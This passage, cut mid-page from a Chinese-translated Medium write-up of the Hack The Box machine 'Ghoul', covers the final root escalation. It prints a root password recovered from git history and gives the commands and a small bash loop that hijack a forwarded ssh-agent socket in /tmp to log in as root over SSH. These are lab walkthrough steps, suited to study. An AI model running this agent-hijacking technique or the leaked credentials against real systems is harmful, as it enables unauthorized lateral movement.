class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我通过检查ORIG_HEAD来列举:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="8c3e" class="ml kz iq mh b gy mm mn l mo mp">git show ORIG_HEAD</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pt"><img src="../Images/301213814fc118b482bfa734e03da1ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*acgIQW-lI2h971aTH7GARQ.png"/></div></div></figure><p id="2fff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我看到更多的凭证。我尝试了每个用户的密码，结果是:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="10ad" class="ml kz iq mh b gy mm mn l mo mp"><strong class="mh ir"> root:7^Grc%C\7xEQ?tb4</strong></span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pu"><img src="../Images/d98b1a4870cbd0f439af252f479528a0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lpc01RifNXn3yqqljrpNVQ.png"/></div></div></figure><p id="d092" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">太好了。我现在是root用户，可以读取一个名为root.txt的文件，但它是一个“巨魔”..😫</p><p id="673f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我首先检查kaneki_adm目录中的内容:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pv"><img src="../Images/2e0df235564314585169148f0f0b3900.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tTd9-j9i3yiPg2Ro8CJ5kw.png"/></div></div><figcaption class="ku kv gj gh gi kw kx bd b be z dk translated">kaneki_adm</figcaption></figure><p id="ccb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我检查tmp文件夹中的内容，看到文件夹奇怪的目录从ssh开始。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pw"><img src="../Images/4ddb34f11185b16789c9d5c9771f4b6b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IJpWRvgYhrJTpJ0pNCSM6g.png"/></div></div></figure><p id="c511" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我运行ps aux来查看哪些进程正在运行:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi px"><img src="../Images/0d94b5f7258d5c8da582718d3691422c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cn0ziXZwHo99-IYSbn6rNA.png"/></div></div></figure><p id="bef3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，有一个到端口2222的ssh连接正在启动，但是该进程在一段时间后终止。</p><h1 id="d919" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">SSH-劫持</h1><p id="0c35" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我参考了这篇博客来了解关于这次攻击的更多信息:</p><p id="8307" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/" rel="noopener ugc nofollow" target="_blank">https://xorl . WordPress . com/2018/02/04/ssh-jacking-for-lateral-movement/</a></p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="5433" class="ml kz iq mh b gy mm mn l mo mp">When you connect to a remote system you can choose if you want your  ssh-agent to be available there too using the ForwardAgent directive. By  forwarding the agent you can move around systems without having to copy  keys everywhere or re-authenticating manually. However, this has a  downside too. <strong class="mh ir">If an attacker has root access on any of the systems from  which you have forwarded your agent, he can re-use that socket file to  open new SSH sessions with your information.</strong></span></pre><p id="78aa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我可以尝试使用root用户使用的凭证在端口2222上进行ssh，通过将代理的SSH_AUTH_SOCK存储到我的env中并将其添加到我的ssh-agent中来劫持代理。我首先将pspy64s的二进制文件放到kaneki-pc上，并运行它来监视进程发生的时间。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi py"><img src="../Images/29a934b8e82ed6c45a15c59417296bfd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7m4Ba82_UnuEaCX1C14OgQ.png"/></div></div></figure><p id="34b8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当这个过程发生时，我将检查/tmp文件夹，查找在ssh连接发生时出现的代理。请注意，当我再次检查目录时，这些代理消失了。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/08bdff767d3f8b766ecede96b48d329b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1270/format:webp/1*guJW6K4rHt0S7l-CVpZBIw.png"/></div></figure><p id="835f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我看到连接每6分钟发生一次:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi pz"><img src="../Images/6e4637453065eb9e659f27e616d1d6e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qwiNrWSy2GcDOeXgRzii5Q.png"/></div></div></figure><p id="c3cb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我等待连接启动的时间间隔，并调用:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="e08f" class="ml kz iq mh b gy mm mn l mo mp">SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.XXX ssh root@172.18.0.1 -p 2222</span></pre><p id="4554" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我可以登录了！</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi qa"><img src="../Images/e222d092c245bfe62991c5d4c0f6b665.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-qPx2XwKls7p71FsZ1DGDA.png"/></div></div></figure><p id="6c0c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在可以读取root.txt..😅</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="7445" class="ml kz iq mh b gy mm mn l mo mp">root@Aogiri:~# cat root.txt<br/>7c0f11041f....</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi qb"><img src="../Images/83510f8575f392c6b4c2a62867a8be85.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KMgs2N_HUiLHfHp5zDW5bw.png"/></div></div></figure><p id="0369" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您也可以通过这个简单的脚本编写脚本并自动执行劫持来实现这一点:</p><pre class="kn ko kp kq gt mg mh mi mj aw mk bi"><span id="b053" class="ml kz iq mh b gy mm mn l mo mp">#!/bin/bash</span><span id="3523" class="ml kz iq mh b gy oo mn l mo mp">while true; do agent=$(find . -name agent.*)<br/>        if [[$agent != '']]; then<br/>        echo "$agent"<br/>        break<br/>        fi<br/>done<br/>SSH_AUTH_SOCK=$agent ssh root@172.18.0.1 -p 2222</span></pre><p id="4718" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">注意这样会触发很多进程，而且会很吵！</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi qc"><img src="../Images/5368f86d5cb262447c74b7dbf8e6bf1e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-gipYSrabzfAKrdYWoZNFg.png"/></div></div></figure><p id="efbf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我就是这样解决了黑客盒子里的食尸鬼！这是一个非常漫长的旅程，但绝对值得！感谢阅读！🍺</p></div><div class="ab cl qd qe hu qf" role="separator"><span class="qg bw bk qh qi qj"/><span class="qg bw bk qh qi qj"/><span class="qg bw bk qh qi"/></div><div class="ij ik il im in"><p id="1777" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="ox">关注</em> <a class="ae kl" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="ox"> Infosec报道</em> </a> <em class="ox">获取更多此类精彩报道。</em></p><div class="nt nu gp gr nv nw"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="nx ab fo"><div class="ny ab nz cl cj oa"><h2 class="bd ir gy z fp ob fr fs oc fu fw ip bi translated">信息安全报道</h2><div class="od l"><h3 class="bd b gy z fp ob fr fs oc fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="oe l"><p class="bd b dl z fp ob fr fs oc fu fw dk translated">medium.com</p></div></div><div class="of l"><div class="qk l oh oi oj of ok ks nw"/></div></div></a></div></div></div>    
</body>
</html>